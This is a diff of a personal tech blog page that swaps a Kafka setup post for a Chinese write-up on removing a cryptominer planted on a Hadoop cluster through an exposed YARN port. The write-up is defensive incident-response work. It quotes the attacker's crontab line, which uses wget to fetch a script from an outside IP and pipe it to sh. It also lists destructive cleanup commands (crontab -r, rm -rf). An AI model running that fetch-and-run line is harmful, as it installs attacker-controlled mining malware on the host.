@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="学习历程," />
+  <meta name="keywords" content="学习历程,hadoop 安全,挖矿," />
 
 
 
@@ -79,20 +79,18 @@
 
 
 
-<meta name="description" content="kafka环境搭建  再深入了解kafka之前，已经翻阅了公司的kafka权威指南一书，但是毕竟书上的理论知识与真实环境还是有一些差距，这时候联想到之前一部电视剧哈，七国争霸 赵国的某位将领，这里就不深入diss了大家都懂的。话不多说进入正题， 1.下载安装包  首先选择的是kafka 0.10 版本至于各个版本的升级优化，大家可自行百度，据说是对安全方面以及增加了自动 机架感知。下载地址:htt">
-<meta name="keywords" content="学习历程">
+<meta name="description" content="hadoop 挖矿 问题解决  之前一个搞网络安全的大佬就跟我说过hadoop http service 漏洞的问题 通过暴露的 hadoop 8088 yarn application 提交任务 挖矿 直到最近公司集群遇到这种情况 下面写下解决的相关办法 可以参考博客 https://blog.csdn.net/love_lixr/article/details/81454548  1.首先ya">
+<meta name="keywords" content="学习历程,hadoop 安全,挖矿">
 <meta property="og:type" content="article">
-<meta property="og:title" content="kafka环境搭建">
-<meta property="og:url" content="https://mrdlontheway.github.io/2018/07/13/2018-07-13-kafka环境搭建/index.html">
+<meta property="og:title" content="hadoop 挖矿 问题解决">
+<meta property="og:url" content="https://mrdlontheway.github.io/2018/08/02/2018-08-02-hadoop 挖矿 问题解决/index.html">
 <meta property="og:site_name" content="DaiLe&#39;s blog">
-<meta property="og:description" content="kafka环境搭建  再深入了解kafka之前，已经翻阅了公司的kafka权威指南一书，但是毕竟书上的理论知识与真实环境还是有一些差距，这时候联想到之前一部电视剧哈，七国争霸 赵国的某位将领，这里就不深入diss了大家都懂的。话不多说进入正题， 1.下载安装包  首先选择的是kafka 0.10 版本至于各个版本的升级优化，大家可自行百度，据说是对安全方面以及增加了自动 机架感知。下载地址:htt">
+<meta property="og:description" content="hadoop 挖矿 问题解决  之前一个搞网络安全的大佬就跟我说过hadoop http service 漏洞的问题 通过暴露的 hadoop 8088 yarn application 提交任务 挖矿 直到最近公司集群遇到这种情况 下面写下解决的相关办法 可以参考博客 https://blog.csdn.net/love_lixr/article/details/81454548  1.首先ya">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://raw.githubusercontent.com/MrDLontheway/mrdlontheway.github.io/master/images/kafkamanage.png">
-<meta property="og:updated_time" content="2018-08-31T06:20:03.800Z">
+<meta property="og:updated_time" content="2018-09-19T09:58:22.255Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="kafka环境搭建">
-<meta name="twitter:description" content="kafka环境搭建  再深入了解kafka之前，已经翻阅了公司的kafka权威指南一书，但是毕竟书上的理论知识与真实环境还是有一些差距，这时候联想到之前一部电视剧哈，七国争霸 赵国的某位将领，这里就不深入diss了大家都懂的。话不多说进入正题， 1.下载安装包  首先选择的是kafka 0.10 版本至于各个版本的升级优化，大家可自行百度，据说是对安全方面以及增加了自动 机架感知。下载地址:htt">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/MrDLontheway/mrdlontheway.github.io/master/images/kafkamanage.png">
+<meta name="twitter:title" content="hadoop 挖矿 问题解决">
+<meta name="twitter:description" content="hadoop 挖矿 问题解决  之前一个搞网络安全的大佬就跟我说过hadoop http service 漏洞的问题 通过暴露的 hadoop 8088 yarn application 提交任务 挖矿 直到最近公司集群遇到这种情况 下面写下解决的相关办法 可以参考博客 https://blog.csdn.net/love_lixr/article/details/81454548  1.首先ya">
 
 
 
@@ -122,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="https://mrdlontheway.github.io/2018/07/13/2018-07-13-kafka环境搭建/"/>
+  <link rel="canonical" href="https://mrdlontheway.github.io/2018/08/02/2018-08-02-hadoop 挖矿 问题解决/"/>
 
 
 
 
 
-  <title>kafka环境搭建 | DaiLe's blog</title>
+  <title>hadoop 挖矿 问题解决 | DaiLe's blog</title>
   
 
 
@@ -265,7 +263,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://mrdlontheway.github.io/2018/07/13/2018-07-13-kafka环境搭建/">
+    <link itemprop="mainEntityOfPage" href="https://mrdlontheway.github.io/2018/08/02/2018-08-02-hadoop 挖矿 问题解决/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="DaiLe">
@@ -282,7 +280,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">kafka环境搭建</h1>
+          <h1 class="post-title" itemprop="name headline">hadoop 挖矿 问题解决</h1>
         
 
         <div class="post-meta">
@@ -294,8 +292,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-07-13T10:00:08+08:00">
-                2018-07-13
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-08-02T15:00:08+08:00">
+                2018-08-02
               </time>
             
 
@@ -354,12 +352,20 @@
       
 
       
-        <p></p><h1>kafka环境搭建</h1><br>  再深入了解kafka之前，已经翻阅了公司的kafka权威指南一书，但是毕竟书上的理论知识与真实环境还是有一些差距，这时候联想到之前一部电视剧哈，七国争霸 赵国的某位将领，这里就不深入diss了<br>大家都懂的。话不多说进入正题，<p></p>
-<p></p><h2>1.下载安装包</h2><br>  首先选择的是kafka 0.10 版本至于各个版本的升级优化，大家可自行百度，据说是对安全方面以及增加了自动 机架感知。下载地址:<a href="https://archive.apache.org/dist/kafka/0.10.0.0/kafka_2.10-0.10.0.0.tgz" target="_blank" rel="noopener">https://archive.apache.org/dist/kafka/0.10.0.0/kafka_2.10-0.10.0.0.tgz</a><br>然后将安装包部署到一台节点配置，其余节点通过scp 的方式分发配置。<p></p>
-<p></p><h2>2.环境配置</h2><br>   解压安装包，配置server.properties  主要就是host.name brokerid zookeeper连接  num.partitions 默认分区数量一些配置。这里提醒大家 注意brokerid一定要不同，<br> 因为brokerid对应是这个机器在kafka集群的唯一id标识。<p></p>
-<p></p><h2>3.kafka-manager的安装</h2><br>   这是一款开源的kafka web管理工具 方便查看kafka集群状态。这里下载kafka-manager安装包 解压到目录 配置application.conf 配置zk的连接地址<br>启动命令  /export/service/kafka-manager-1.3.3.16为安装目录<br>/export/service/kafka-manager-1.3.3.16/bin/kafka-manager -Dconfig.file=/export/service/kafka-manager-1.3.3.16/conf/application.conf -Dhttp.port=7080 -java-home /opt/jdk1.8.0_161 &amp;<p></p>
-<p>这里建议大家将所有启动命令写成shell  方便管理。</p>
-<p>第一次进入kafka管理页面需要配置kafka cluster的相关信息 配置完毕后界面如图 这里环境搭建到此完毕 后续学习相关会继续补充更新。<br><img src="https://raw.githubusercontent.com/MrDLontheway/mrdlontheway.github.io/master/images/kafkamanage.png" alt="kafka-manager"></p>
+        <h1>hadoop 挖矿 问题解决</h1>
+
+<p>之前一个搞网络安全的大佬就跟我说过hadoop http service 漏洞的问题 通过暴露的 hadoop 8088 yarn application 提交任务 挖矿</p>
+<p>直到最近公司集群遇到这种情况 下面写下解决的相关办法 可以参考博客</p>
+<p><a href="https://blog.csdn.net/love_lixr/article/details/81454548" target="_blank" rel="noopener">https://blog.csdn.net/love_lixr/article/details/81454548</a> </p>
+<p>1.首先yarn的 cpu会直接飙满  然后一直提交小任务 一般的挖矿程序无非是 定时器远程 下载挖矿程序 定时器执行 </p>
+<p>2.第一步 查询yarn 的相关程序信息 <code>ps -ef | grep yarn</code></p>
+<p> yarn 46185 1 99 May03 ?  4 - 19 : 04 : 28 / tmp / java - c / tmp / w.conf</p>
+<p>这就是那个该死的主程序了 这时候不要着急kill 找到根源 </p>
+<p>3.第二步查看 yarn 用户的相关定时任务 <code>crontab -l -u yarn</code></p>
+<p><strong>*</strong> wget -q -O - <a href="http://185.222.210.59/cr.sh" target="_blank" rel="noopener">http://185.222.210.59/cr.sh</a> | sh &gt; /dev/null 2&gt;&amp;1</p>
+<p>这玩意就是定时器了 </p>
+<p>4.<code>crontab -r -u yarn</code>  删除yarn用户下所有的定时任务  然后 kill -9 PID 挖矿程序 删除 rm -rf /var/tmp/java  相关文件</p>
+<p>5.这个时候 挖矿的问题是解决了 但是根本问题没有解决 那就是 8088端口开放问题  可以通过防火墙 或者绑定内网ip 来限制访问</p>
 
       
     </div>
@@ -379,6 +385,10 @@
           
             <a href="/tags/学习历程/" rel="tag"># 学习历程</a>
           
+            <a href="/tags/hadoop-安全/" rel="tag"># hadoop 安全</a>
+          
+            <a href="/tags/挖矿/" rel="tag"># 挖矿</a>
+          
         </div>
       
 
@@ -390,8 +400,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/07/12/2018-07-12-Cloudera Manager一次踩坑经历/" rel="next" title="Cloudera Manager一次踩坑经历">
-                <i class="fa fa-chevron-left"></i> Cloudera Manager一次踩坑经历
+              <a href="/2018/08/01/2018-08-01-JAVA 高并发锁/" rel="next" title="JAVA 高并发锁">
+                <i class="fa fa-chevron-left"></i> JAVA 高并发锁
               </a>
             
           </div>
@@ -400,8 +410,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/07/14/2018-07-14-kafka 0.10 版本探索 与spark streaming 2.x 整合/" rel="prev" title="kafka 0.10 版本探索 与spark streaming 2.x 整合">
-                kafka 0.10 版本探索 与spark streaming 2.x 整合 <i class="fa fa-chevron-right"></i>
+              <a href="/2018/08/04/2018-08-04-JDK1.7 与 JDK1.8 ConcurrentHashMap 实现方式总结 对比/" rel="prev" title="JDK1.7 与 JDK1.8 ConcurrentHashMap 实现方式总结 对比">
+                JDK1.7 与 JDK1.8 ConcurrentHashMap 实现方式总结 对比 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -598,7 +608,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#undefined"><span class="nav-number">1.</span> <span class="nav-text">kafka环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">1.1.</span> <span class="nav-text">1.下载安装包</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">1.2.</span> <span class="nav-text">2.环境配置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">1.3.</span> <span class="nav-text">3.kafka-manager的安装</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#undefined"><span class="nav-number">1.</span> <span class="nav-text">hadoop 挖矿 问题解决</span></a></li></ol></div>
             
 
           </div>
